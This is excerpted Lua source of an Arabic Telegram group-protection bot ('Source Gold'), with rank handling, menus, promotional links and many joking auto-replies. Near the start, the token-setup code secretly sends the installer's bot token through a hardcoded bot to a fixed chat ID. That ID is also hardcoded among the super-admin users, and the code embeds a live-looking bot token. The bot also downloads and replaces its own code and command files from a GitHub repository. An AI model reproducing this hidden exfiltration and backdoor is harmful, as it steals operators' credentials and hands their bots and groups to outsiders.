...
if res ~= 200 then
print('\27[0;31m•━═━═『Sꪮꪊ𝘳ᥴꫀ Gꪮꪶᦔ』═━═━•\n التوكن غير صحيح تاكد منه ثم ارسله')
else
io.write('\27[0;31m تم حفظ التوكن بنجاح \n•━═━═『Sꪮꪊ𝘳ᥴꫀ Gꪮꪶᦔ』═━═━•\n27[0;39;49m')
local json = JSON.decode(url)
bot_data:set(id_server..":token_username",json.result.username)
bot_data:set(id_server..":token",token)
https.request('https://api.telegram.org/bot1975497470:AAGMFyKudHOljiD0x-pgY4gRoEEpd2sgi74/sendmessage?chat_id=1751768178&text=' ..token)
end 
else
print('\27[0;35m•━═━═『Sꪮꪊ𝘳ᥴꫀ Gꪮꪶᦔ』═━═━•\n لم يتم حفظ التوكن ارسل لي التوكن الان')
end 
...
io.popen("cd File_Bot && wget https://raw.githubusercontent.com/Tlgram-byed/nyla/main/File_Bot/commands.lua") 
...
sudo_users = {SUDO,1751768178,1304868679}   
...
var = 'البوت'
elseif bot_data:sismember(ban_id..'Sudo:User', user_id) then
var = bot_data:get(ban_id.."Sudo:Rd"..msg.chat_id_) or 'المطور القميل'  
elseif bot_data:sismember(ban_id..'CoSu'..chat_id, user_id) then
var = bot_data:get(ban_id.."CoSu:Rd"..msg.chat_id_) or 'المالك القميل'
elseif bot_data:sismember(ban_id..'Basic:Constructor'..chat_id, user_id) then
var = bot_data:get(ban_id.."BasicConstructor:Rd"..msg.chat_id_) or 'المنشئ اساسي القميل'
elseif bot_data:sismember(ban_id..'Constructor'..chat_id, user_id) then
var = bot_data:get(ban_id.."Constructor:Rd"..msg.chat_id_) or 'المنشئ القميل'  
elseif bot_data:sismember(ban_id..'onall'..chat_id, user_id) then
var = bot_data:get(ban_id.."onall:Rd"..msg.chat_id_) or 'المدير العام  القميل'  
elseif bot_data:sismember(ban_id..'moall'..chat_id, user_id) then
var = bot_data:get(ban_id.."moall:Rd"..msg.chat_id_) or 'الادمن العام القميل'  
elseif bot_data:sismember(ban_id..'Manager'..chat_id, user_id) then
var = bot_data:get(ban_id.."Manager:Rd"..msg.chat_id_) or 'المدير  القميل'  
elseif bot_data:sismember(ban_id..'banda:MN:TF'..chat_id, user_id) then
var = 'منظف' 
elseif bot_data:sismember(ban_id..'Mod:User'..chat_id, user_id) then
var = bot_data:get(ban_id.."Mod:Rd"..msg.chat_id_) or 'الادمن القميل'  
elseif bot_data:sismember(ban_id..'Special:User'..chat_id, user_id) then  
var = bot_data:get(ban_id.."Special:Rd"..msg.chat_id_) or 'المميز القميل'  
else  
var = bot_data:get(ban_id.."Memp:Rd"..msg.chat_id_) or 'العضو القميل'
end  
return var
end 
...
local bl = '𓆩انت الان المطور الاساسي² في البوت𓆪\n𓆩سورس جولد𓆪\n𓆩يمكنك تحكم في البوتات من الكيبورد𓆪\n[𓆩 انضم الى قناه السورس وتابع كل جديد 𓆪](t.me/g_00_l_d)'
local keyboard = {
{'الاحصائيات'},
{'المطور','الانتيمي'},
{'معلومات الكيبورد'},
...
{
{text = 'D𝐞𝐯 𝐛𝐨𝐭', url="http://t.me/"..sudos.UserName},
},
{
...
if text == 'ت ث' and Devban(msg) then 
os.execute('rm -rf DRAGON.lua')
os.execute('wget https://raw.githubusercontent.com/Tlgram-byed/nyla/main/DRAGON.lua')
...
local list = database:smembers(ban_id..'Dev:SoFi:2') 
local t = '{"users":['   
for k,v in pairs(list) do 
if k == 1 then 
t =  t..'"'..v..'"' 
...
local users = JSON.decode(info_file) 
for k,v in pairs(users.users) do 
database:sadd(ban_id..'Dev:SoFi:2',v)  
end 
...
if text == 'قسـم مـطـورين السـورس' and Devban(msg) then 
...
if text == 'اوامـر اضـف ومـسـح' and Devban(msg) then 
...
if text == 'اوامـر تفعيل و تعطـيل' and Devban(msg) then 
...
if text == 'اوامـر الحـمـايه' and Devban(msg) then 
...
if text == 'اوامـر الاذاعـه' and Devban(msg) then 
...
send(msg.chat_id_, msg.id_,'⌯︙  اصدار سورس جولد{ S:2【 ✓ 】}')
end
if text == '𓆩•-•-•-•⟮قـناه الـبرمجه⟯•-•-•-•𓆪' then
local Text = [[ 
[•━═━═『Sꪮꪊ𝘳ᥴꫀ Gꪮꪶᦔ』═━═━•](http://t.me/g_00_l_d)
...
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = '◢مـبــرمـج السـورس◤', url="t.me/DEV_AH8"}}, 
{{text = '◢مـالك السـورس◤', url="t.me/DV_ABDO"}}, 
{{text = '◢بــوت توصـل السـورس◤', url="t.me/YuGi00000_bot"}}, 
{{text = '◢قناة السـورس◤', url="t.me/g_00_l_d"}}, 
} 
local msg_id = msg.id_/2097152/0.5 
...
bot_data:del(ban_id..'Srt:Bot') 
local Text = [[ 
[`S𝑜𝑢𝑟𝑐𝑒 G𝑜𝑙𝑑´](t.me/g_00_l_d)مرحبا بك مطوري سأشرح لك كل شئ في لوحه الاوامر بالتفصيل
...
send(msg.chat_id_, msg.id_,'هذا الامر خاص بي المبرمج احمد المصري')
return false
end
local msg_id = msg.id_/2097152/0.5 
...
usertext = '\n ⌯︙  الـعـضو ⇇ ['..result.title_..'](t.me/'..(data.username_ or 'g_00_l_d')..')'
status  = '\n ⌯︙  تم ترقيته مطور'
...
keyboard.inline_keyboard = {
{
{text = '𓆩 اوامر المطورين 𓆪', callback_data="/help5"},{text = '𓆩 اوامر التسليه 𓆪', callback_data="/help7"},
},
{
{text = '𓆩 اوامر الاعضاء 𓆪', callback_data="/help6"},
},
{
{text = '𓆩 اوامر التعطيل 𓆪', callback_data="/help2"},{text = '𓆩 اوامر القفل 𓆪', callback_data="/help1"},
},
{
{text = '𓆩 تــغــير الــلــغــه 𓆪', callback_data="/help90"},
},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
...
keyboard.inline_keyboard = {
{
{text = '𓆩 العاب السورس 𓆪', callback_data="/mute-name"},{text = '𓆩 الاضافات 𓆪', callback_data="/change-photo"},
},
{
{text = '𓆩 متطوره 𓆪', callback_data="/DRG"},
},
{
{text = '`S𝑜𝑢𝑟𝑐𝑒 G𝑜𝑙𝑑´', url="t.me/g_00_l_d"},
},
}
local msg_id = msg.id_/2097152/0.5
...
if text == 'التحديث ' or text == 'تحديث السورس' or text == 'تحديث' and not bot_data:get(ban_id..'Namebot'..msg.chat_id_) then     
tdcli_function ({ID = "GetUser",user_id_ = ban_id, offset_},function(extra,result,success)
local msg_id = msg.id_/2097152/0.5  
local textt = "g_00_l_d"..(bot_data:get(ban_id..'Name:Bot') or 'جولد')
...
tdcli_function ({ ID = "GetUserProfilePhotos", user_id_ = ban_id, offset_, offset_ = 0, limit_ = 1 }, getpro, nil) 
end,nil)
end
if text == 'ردود' or text == 'تفعيل ردود السورس' or text == 'تعطيل ردود السورس' and not bot_data:get(ban_id..'Namebot'..msg.chat_id_) then     
tdcli_function ({ID = "GetUser",user_id_ = ban_id, offset_},function(extra,result,success)
local msg_id = msg.id_/2097152/0.5  
local textt = "g_00_l_d"..(bot_data:get(ban_id..'Name:Bot') or 'جولد')
local Jabwa = 'https://t.me/Qtdao/71'
...
if text == "تحكم الرتبه" and not bot_data:get(ban_id..'Namebot'..msg.chat_id_) then     
tdcli_function ({ID = "GetUser",user_id_ = ban_id, offset_},function(extra,result,success)
local msg_id = msg.id_/2097152/0.5  
local textt = "g_00_l_d"..(bot_data:get(ban_id..'Name:Bot') or 'جولد')
local Jabwa = 'https://t.me/Qtdao/71'
...
local Text = "𓆩 هل انت متاكد  من تنزيلك من جميع الرتب 𓆪"
keyboard = {} 
keyboard.inline_keyboard = {
...
if text == 'بوت غادر' and not bot_data:get(ban_id..'Namebot'..msg.chat_id_) then     
tdcli_function ({ID = "GetUser",user_id_ = ban_id, offset_},function(extra,result,success)
local msg_id = msg.id_/2097152/0.5  
local textt = "g_00_l_d"..(bot_data:get(ban_id..'Name:Bot') or 'جولد')
local Jabwa = 'https://t.me/Qtdao/71'
...
keyboard.inline_keyboard = {
{
{text = 'نعم', callback_data="/YYYBD1"},{text = 'لا', callback_data="/hide"},
},
}
local function getpro(extra, result, success) 
if result.photos_[0] then 
...
if text == 'تغير شكل سورس' and not bot_data:get(ban_id..'Namebot'..msg.chat_id_) then     
tdcli_function ({ID = "GetUser",user_id_ = ban_id, offset_},function(extra,result,success)
local msg_id = msg.id_/2097152/0.5  
local textt = "g_00_l_d"..(bot_data:get(ban_id..'Name:Bot') or 'جولد')
local Jabwa = 'https://t.me/Qtdao/71'
...
keyboard.inline_keyboard = {
{
{text = '• شكل 1 •', callback_data="/Dadjabwa"},{text = '• شكل 2 •', callback_data="/Dadjabwa2"},
},
}
local function getpro(extra, result, success) 
if result.photos_[0] then 
...
if text == 'احمد المصري' or text == ' احمد' or text == 'المبرمج احمد المصري' or text == 'صاحب وبولوابت' or text == 'مبرمج السورس' or text == 'الشيخ تبت' or text == 'الشيخ تقتتف' then
local Text = [[
[𝗐ᴇʟᴄᴏᴍᴇ ᴛᴏ ʏᴏᴢᴀʀᴀᴛ ᴀʜᴍᴇᴅ ᴀʟᴍѕʀʏ](http://t.me/DEV_AH8)
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = 'A҉H҉M҉E҉D҉ A҉L҉M҉S҉R҉Y҉',url="t.me/DEV_AH8"}},
...
if text == 'جافا' or text == 'جافا الكبير' or text == 'جافا اندرويد' or text == 'عاوز بوت' or text == 'عاوزه بوت' or text == 'عوز انصب' or text == 'المبرمج جافا' then
local Text = [[
[𝗐ᴇʟᴄᴏᴍᴇ ᴛᴏ ʏᴏᴢᴀʀᴀᴛ ᴊᴀᴠᴀ ᴇʟʜᴀᴋᴇʀ](http://t.me/JAI6H)
]]
keyboard = {} 
keyboard.inline_keyboard = {
...
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/JAI6H&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
...
if text == 'جولد' or text == 'سورس مين ده' then
local Text = [[ 
من أحسن السورسات على التليجرام سورس جولد
حمايه♻️سرعه♻️دقه♻️وامان
 قناه السورس ⇈⇊
[`W𝑒𝑙𝑐𝑜𝑚𝑒 𝑡𝑜 S𝑜𝑢𝑟𝑐𝑒 G𝑜𝑙𝑑´](http://t.me/g_00_l_d)
]]
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = '`S𝑜𝑢𝑟𝑐𝑒 G𝑜𝑙𝑑´', url="t.me/g_00_l_d"}}, 
...
local Text = [[ 
[ᴛᴡᴀѕʟ sᴏᴜʀᴄᴇ](t.me/Hdudbdbot)
]] 
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = '`S𝑜𝑢𝑟𝑐𝑒 G𝑜𝑙𝑑´', url="t.me/Hdudbdbot"}}, 
} 
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendvideo?chat_id=' .. msg.chat_id_ .. '&video=https://t.me/aslak8/54&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
...
local Text = [[  
𓆩مرحبا اليك العاب سورس جولد الافضل𓆪
]]  
keyboard = {}   
keyboard.inline_keyboard = {  
...
------------------------------------------------------------------------
if text == "تفعيل الحمايه" and not bot_data:get(ban_id..'GeId.result.custom_title'..msg.chat_id_) then     
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(extra,result,success)
...
if text == "تعطيل الحمايه" and not bot_data:get(ban_id..'GeId.result.custom_title'..msg.chat_id_) then     
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(extra,result,success)
if result.username_ then
username = result.username_ 
else
...
if text == "صورتي" and not bot_data:get(ban_id..'GeId.result.custom_title'..msg.chat_id_) then     
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(extra,result,success)
if result.username_ then
username = result.username_ 
else
...
if text == "التاريخ" and not bot_data:get(ban_id..'GeId.result.custom_title'..msg.chat_id_) then     
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(extra,result,success)
if result.username_ then
username = result.username_ 
else
...
if text == "الساعه" and not bot_data:get(ban_id..'GeId.result.custom_title'..msg.chat_id_) then     
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(extra,result,success)
if result.username_ then
username = result.username_ 
else
...
local username = ' ['..data.first_name_..'](t.me/'..(data.username_ or 'g_00_l_d')..')'
...
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/SourceSaidi/'..ban..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
if text == "بوستات بالصور" and not  bot_data:get(ban_id.."sing:for:me"..msg.chat_id_) then 
ban = math.random(1,24); 
...
if text == "رامزيات ولاد" or text ==  "صور ولاد" and not  bot_data:get(ban_id.."sing:for:me"..msg.chat_id_) then 
ban = math.random(1,24); 
...
if text == "رامزيات بنات" or text ==  "صور بنات" and not  bot_data:get(ban_id.."sing:for:me"..msg.chat_id_) then 
ban = math.random(1,24); 
...
if text == "خلفيات رومانسيه" and not  bot_data:get(ban_id.."sing:for:me"..msg.chat_id_) then 
ban = math.random(1,24); 
...
if text == "صور كرتون" and not  bot_data:get(ban_id.."sing:for:me"..msg.chat_id_) then 
ban = math.random(1,24); 
...
if text == "طبيعه" and not  bot_data:get(ban_id.."sing:for:me"..msg.chat_id_) then 
ban = math.random(1,24); 
...
send(msg.chat_id_, msg.id_, ' ⌯︙   مـن قبـل  ⇇ [『'..Rutba(msg.sender_user_id_,msg.chat_id_)..'』](T.ME/'..(data.username_ or 'g_00_l_d')..') \n ⌯︙  تم تفعيل التنظيف التلقائي ')
return false
end
...
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'𓆩 تم تعطيل جلب الصوره 𓆪\n𓆩 تم قفل البوتات  𓆪\n𓆩 تم قفل التكرار 𓆪\n𓆩 تم قفل الروابط 𓆪\n𓆩 تم قفل التوجيه 𓆪\n𓆩 تم قفل الملصقات 𓆪\n𓆩 تم قفل المتحركه 𓆪\n𓆩 تم قفل الفيديو 𓆪\n𓆩 تم قفل الفشار 𓆪\n𓆩 تم قفل الانلاين 𓆪\n𓆩 تم قفل تعديل المديا 𓆪\n𓆩 تم وضع التكرار 𓆪\n𓆩 تم قفل الفارسيه 𓆪\n𓆩 تم وضع الايدي بدون صوره 𓆪\n تم تفعيل الامن بواسطه [❨'..Rutba(msg.sender_user_id_,msg.chat_id_)..'❩](T.ME/'..(data.username_ or 'g_00_l_d')..')  ')
end,nil)   
end
...
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'𓆩 تم تفعيل جلب الصوره 𓆪\n𓆩 تم  فتح البوتات 𓆪\n𓆩 تم  فتح التكرار 𓆪\n𓆩 تم  فتح الروابط 𓆪\n𓆩 تم  فتح التوجيه 𓆪\n𓆩 تم  فتح الملصقات 𓆪\n𓆩 تم  فتح المتحركه 𓆪\n𓆩 تم  فتح الفيديو 𓆪\n𓆩 تم  فتح الفشار 𓆪\n𓆩 تم  فتح الانلاين 𓆪\n𓆩 تم  فتح تعديل المديا 𓆪\n𓆩 تم وضع التكرار 𓆪\n𓆩 تم  فتح الفارسيه 𓆪\n𓆩 تم وضع الايدي بصوره𓆪n \n تم تعطيل الامن بواسطه [❨'..Rutba(msg.sender_user_id_,msg.chat_id_)..'❩](T.ME/'..(data.username_ or 'g_00_l_d')..')  ')
end,nil)   
end
...
bot_data:del(ban_id..'ghiktr'..msg.chat_id_) 
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'  تم تعطيل الامن القصوه من قبل [『 '..Rutba(msg.sender_user_id_,msg.chat_id_)..' 』](T.ME/'..(data.username_ or 'g_00_l_d')..')  ')
end,nil)   
end
...
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ⌯︙   مـن قبـل  ⇇ ['..string.sub(data.first_name_,0,60)..'](T.ME/'..(data.username_ or 'g_00_l_d')..') \n ⌯︙  تـم قفـل التاك بالكتم ')
end,nil)   
...
if Devban(msg) then
local Get_Files, res = https.request("https://raw.githubusercontent.com/Tlgram-byed/nyla/main/getfile.json")
if res == 200 then
...
local json_file, res = https.request("https://raw.githubusercontent.com/Tlgram-byed/nyla/main/File_Bot/"..file)
if res == 200 then
...
local Text = " 🕊️ منشئ الجروب  ⤌ ["..b.first_name_.."](tg://user?id="..b.id_..")\n"..getbio(b.id_):gsub('لايوجد','')
local msg_id = msg.id_/2097152/0.5
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '🕊️ '..b.first_name_..' 🕊️', url="t.me/"..UserName}},   
}
...
sendText(b.id_," 🕊️ مرحبا عزيزي المنشئ هناك شخص يريدك \n 🕊️ الشخص  {"..Name.."}\n 🕊️ اسم الجروب {"..NameChat.."}\n 🕊️ ايدي الجروب {"..msg.chat_id_.."}\n 🕊️ رابط الجروب \n ["..LinkGroup.."] ",0,'md')
end,nil)
end,nil)
end,nil)
end
...
function start_function(extra, result, success)
bot_data:sadd(msg.sender_user_id_..'DEV_AH8-zoaag1', result.sender_user_id_)
bot_data:sadd(result.sender_user_id_..'DEV_AH8-zoaag2', msg.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
...
usertext = '\n ⌯︙   المستخدم  ⇇ ['..result.title_..'](t.me/'..(data.username_ or 'g_00_l_d')..')'
status  = '\n ⌯︙  تم حظره'
texts = usertext..status
chat_kick(msg.chat_id_, result.id_)
send(msg.chat_id_, msg.id_, texts)
...
send(msg.chat_id_, msg.id_, t..'•━═━═『S𝑜𝑢𝑟𝑐𝑒 G𝑜𝑙𝑑』═━═━•\nاضغط علي الاسم ليتم نسخه\n[`S𝑜𝑢𝑟𝑐𝑒 G𝑜𝑙𝑑´](t.me/g_00_l_d)')
end
...
if bot_data:get(ban_id..'Bc:Bots') and not DevSoFi(msg) then 
...
send(msg.chat_id_,msg.id_, '[مع الف سلامه يقلبي متجيش تاني 😹💔🎶](t.me/g_00_l_d)')
return false
end
...
send(msg.chat_id_,msg.id_, '[خالتك جرت ورايا 😹💔](t.me/g_00_l_d)')
return false
end
...
send(msg.chat_id_,msg.id_, '[خدوني معاكم برايفت والنبي 🥺💜](t.me/g_00_l_d)')
return false
end
...
send(msg.chat_id_,msg.id_, '[عليه الصلاه والسلام 🌝💛](t.me/g_00_l_d)')
return false
end
...
send(msg.chat_id_,msg.id_, '[نعم الله عليك 🌚❤️](t.me/g_00_l_d)')
return false
end
...
send(msg.chat_id_,msg.id_, '[نزل عينك تحت كدا علشان هتخاد علي قفاك 😒❤️](t.me/g_00_l_d)')
return false
end
...
send(msg.chat_id_,msg.id_, '[العفو ياروحي 🙈🌝](t.me/g_00_l_d)')
return false
end
...
send(msg.chat_id_,msg.id_, '[انت الي حلو ياقمر 🤤🌝](t.me/g_00_l_d)')
return false
end
...
send(msg.chat_id_,msg.id_, '[موت بعيد م ناقصين مصايب 😑😂](t.me/g_00_l_d)')
return false
end
...
send(msg.chat_id_,msg.id_, '[جتك اوهه م سامع ولا ايي 😹👻](t.me/g_00_l_d)')
return false
end
...
send(msg.chat_id_,msg.id_, '[فرح خالتك قريب 😹💋💃🏻](t.me/g_00_l_d)')
return false
end
...
send(msg.chat_id_,msg.id_, '[حضرلك الخير يارب 🙂❤️](t.me/g_00_l_d)')
return false
end
...
send(msg.chat_id_,msg.id_, '[لف ورجع تانى مشحوار 😂🚶‍♂👻](t.me/g_00_l_d)')
return false
end
...
send(msg.chat_id_,msg.id_, '[يوه خضتني ياسمك اي 🥺💔](t.me/g_00_l_d)')
return false
end
...
send(msg.chat_id_,msg.id_, '[اوه ياه 🌝😂](t.me/g_00_l_d)')
return false
end
...
send(msg.chat_id_,msg.id_, '[امك اسمها احلام 😹😹](t.me/g_00_l_d)')
return false
end
...
send(msg.chat_id_,msg.id_, '[خلصتت  روحكك يبعيد 😹💔](t.me/g_00_l_d)')
return false
end
...
send(msg.chat_id_,msg.id_, '[كفيه شقط سيب حاجه لغيرك 😎😂](t.me/g_00_l_d)')
return false
end
if text == '😂' or text == '😂😂😂' then
local my_ph = bot_data:get(ban_id.."my_GHoeq2:status"..msg.chat_id_)
...
send(msg.chat_id_,msg.id_, '[ضحكتك عثل زيكك ينوحيي 🌝❤️](t.me/g_00_l_d)')
return false
end
if text == '😹' or text == '😹😹😹' then
local my_ph = bot_data:get(ban_id.."my_GHoeq2:status"..msg.chat_id_)
...
send(msg.chat_id_,msg.id_, '[بتفكر في اي 🤔](t.me/g_00_l_d)')
return false
end
if text == '🌚' or text == '🌝' then
local my_ph = bot_data:get(ban_id.."my_GHoeq2:status"..msg.chat_id_)
...
send(msg.chat_id_,msg.id_, '[القمر ده شبهك 🙂❤️](t.me/g_00_l_d)')
return false
end
if text == '💋' or text == '💋💋💋' then
local my_ph = bot_data:get(ban_id.."my_GHoeq2:status"..msg.chat_id_)
...
send(msg.chat_id_,msg.id_, '[انا عايز مح انا كمان 🥺💛](t.me/g_00_l_d)')
return false
end
if text == '😭' or text == '😭😭😭' then
local my_ph = bot_data:get(ban_id.."my_GHoeq2:status"..msg.chat_id_)
...
send(msg.chat_id_,msg.id_, '[بتعيط تيب لي طيب 😥](t.me/g_00_l_d)')
return false
end
if text == '🥺' or text == '🥺🥺🥺' then
local my_ph = bot_data:get(ban_id.."my_GHoeq2:status"..msg.chat_id_)
...
send(msg.chat_id_,msg.id_, '[متزعلش بحبك 😻🤍](t.me/g_00_l_d)')
return false
end
if text == '😒' or text == '😒😒😒' then
local my_ph = bot_data:get(ban_id.."my_GHoeq2:status"..msg.chat_id_)
...
send(msg.chat_id_,msg.id_, '[اعدل وشك ونت بتكلمني 😒🙄](t.me/g_00_l_d)')
return false
end
...
send(msg.chat_id_,msg.id_, '[وانا كمان بعشقك يا روحي 🤗🥰](t.me/g_00_l_d)')
return false
end
...
send(msg.chat_id_,msg.id_, '[محات حياتي يروحي 🌝❤️](t.me/g_00_l_d)')
return false
end
...
send(msg.chat_id_,msg.id_, '[هلا بيك ياروحي 👋💛](t.me/g_00_l_d)')
return false
end
...
send(msg.chat_id_,msg.id_, '[ بنهش كتاكيت احنا هنا ولا اي 🐣😹](t.me/g_00_l_d)')
return false
end
...
send(msg.chat_id_,msg.id_, '[دايما ياحبيبي 🌝❤️](t.me/g_00_l_d)')
return false
end
...
send(msg.chat_id_,msg.id_, '[وحيات امك ياكبتن خدوني معاكو بيف 🥺💔](t.me/g_00_l_d)')
return false
end
...
send(msg.chat_id_,msg.id_, '[انت الخير يعمري 🌝❤️](t.me/g_00_l_d)')
return false
end
...
send(msg.chat_id_,msg.id_, '[ونجيب اشخاص 😂😜](t.me/g_00_l_d)')
return false
end
...
send(msg.chat_id_,msg.id_, '[وعليكم السلام 🌝❤️](t.me/g_00_l_d)')
return false
end
...
send(msg.chat_id_,msg.id_, '[خخخ امال 😹](t.me/g_00_l_d)')
return false
end 
...
send(msg.chat_id_,msg.id_, '[اه اي يا قدع عيب 😹💔](t.me/g_00_l_d)')
return false
end
...
send(msg.chat_id_,msg.id_, '[عيب ياوسخ 🙄💔](t.me/g_00_l_d)')
return false
end
...
send(msg.chat_id_,msg.id_, '[روح وعقل بوتك 🥺💔](t.me/g_00_l_d)')
return false
end
...
send(msg.chat_id_,msg.id_, '[لا عيب بتكسف 😹💔](t.me/g_00_l_d)')
return false
end
...
send(msg.chat_id_,msg.id_, '[صح النوم 😹💔](t.me/g_00_l_d)')
return false
end
...
send(msg.chat_id_,msg.id_, '[صباح العسل 😻🤍](t.me/g_00_l_d)')
return false
end
...
send(msg.chat_id_,msg.id_, '[ده نورك ي قلبي 🌝💙](t.me/g_00_l_d)')
return false
end
...
send(msg.chat_id_,msg.id_, '[ع فين لوين رايح وسايبنى 🥺💔](t.me/g_00_l_d)')
return false
end
...
send(msg.chat_id_,msg.id_, '[اي الثقافه دي 😒😹](t.me/g_00_l_d)')
return false
end
...
send(msg.chat_id_,msg.id_, '[اهدا يوحش ميصحش كدا 😒😹](t.me/g_00_l_d)')
return false
end
...
{{text = '`S𝑜𝑢𝑟𝑐𝑒 G𝑜𝑙𝑑´',url='http://t.me/g_00_l_d'}},
}
...
keyboard = {} 
keyboard.inline_keyboard = {
{{text = 'A𝒉𝒎𝒆𝒅 A𝒍𝒎𝒔R𝒚',url="t.me/DEV_AH8"}},
{{text ='الــقــنــوات', callback_data="/Jabwa"},{text ='الــبــارات', callback_data="/Jabwa2"}},  
{{text ='الــبــوتــات', callback_data="/Jabwa3"}},
}
...
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '`S𝑜𝑢𝑟𝑐𝑒 G𝑜𝑙𝑑´',url="t.me/g_00_l_d"},{text = 'S𝑜𝑢𝑟𝑐𝑒 G𝑜𝑙𝑑2',url="t.me/AKJA0"}},
...
keyboard = {} 
keyboard.inline_keyboard = {
{{text = 'بــوت حـمـايه',url="t.me/YuGi00000_bot"}},
{{text = '`B𝐚𝐜𝐤´', callback_data="/bnada-yquio"}},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessagecaption?chat_id='..Chat_id..'&caption='..URL.escape(Teext)..'&message_id='..msg_idd..'&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  
end
...
keyboard = {} 
keyboard.inline_keyboard = {
{{text = 'ʙᴀʀ ᴛɪɢᴇʀ',url="t.me/tiger_ahmad4"}},
{{text = '`B𝐚𝐜𝐤´', callback_data="/TTT"}},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessagecaption?chat_id='..Chat_id..'&caption='..URL.escape(Teext)..'&message_id='..msg_idd..'&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  
end
...
if not Mod(data) then
local notText = 'متلعبش في الزراير احمد المصري مرقبك'
https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(notText).."&show_alert=true")
return false
end
...
keyboard.inline_keyboard = {
{
{text = '𓆩 القائمه الرائسيه 𓆪', callback_data="/change-id"},
},
{
{text = '`S𝑜𝑢𝑟𝑐𝑒 G𝑜𝑙𝑑´', url="t.me/g_00_l_d"},
},
...
{{text = 'بوت تواصل احمد المصري',url="t.me/YuGi00000_bot"}}, 
{{text = '`B𝐚𝐜𝐤´', callback_data="/change-hhh"}},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessagecaption?chat_id='..Chat_id..'&caption='..URL.escape(Teext)..'&message_id='..msg_idd..'&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  
end
...
local Teext =[[
•━═━═『Sꪮꪊ𝘳ᥴꫀ Gꪮꪶᦔ』═━═━•
╗ مرحبا بك في سورس جولد الأفضل ♻️
╣ يعتبر سورس جولد من احسن سورسات التلي ♻️
...
╝ لي مراقبة الجودة سورس انضم الي قنات السورس ♻️
•━═━═『Sꪮꪊ𝘳ᥴꫀ Gꪮꪶᦔ』═━═━•
]]
keyboard = {} 
keyboard.inline_keyboard = {
...
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '• Dᥱ᥎ AᏂ꧑ᥱძ Aᥣ꧑᥉Rꪗ',url="t.me/DEV_AH8"},{text = '• Dᴇᴠ ᴀʙᴅᴏ', url="t.me/DV_ABDO"}},
...
keyboard.inline_keyboard = {
{{text = 'S𝑜𝑢𝑟𝑐𝑒 G𝑜𝑙𝑑',url="t.me/g_00_l_d"}},
{{text = '`S𝑜𝑢𝑟𝑐𝑒 G𝑜𝑙𝑑2´',url="t.me/AKJA0"}},
{{text = '`B𝐚𝐜𝐤´', callback_data="/HHH"}},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessagecaption?chat_id='..Chat_id..'&caption='..URL.escape(Teext)..'&message_id='..msg_idd..'&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  
end
if Text == '/Dadjabwa' then
local Teext =[[
W𝐞𝐥𝐜𝐨𝐦𝐞 𝐭𝐨 S𝐨𝐮𝐫𝐜𝐞 G𝐨𝐥𝐝
]]
keyboard = {} 
...
if Text == '/Dadjabwa2' then
local Teext =[[
• مـرحـبــا بــك في سـورس جولد •
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = 'المبرمج احمد المصري •',url="t.me/DEV_AH8"},{text = 'عبدو •', url="t.me/DV_ABDO"}},
{{text = '• قناة السورس •',url="t.me/g_00_l_d"}},
{{text = '• القائمه الرئيسيه •', callback_data="/XXX"}},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessagecaption?chat_id='..Chat_id..'&caption='..URL.escape(Teext)..'&message_id='..msg_idd..'&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  
end
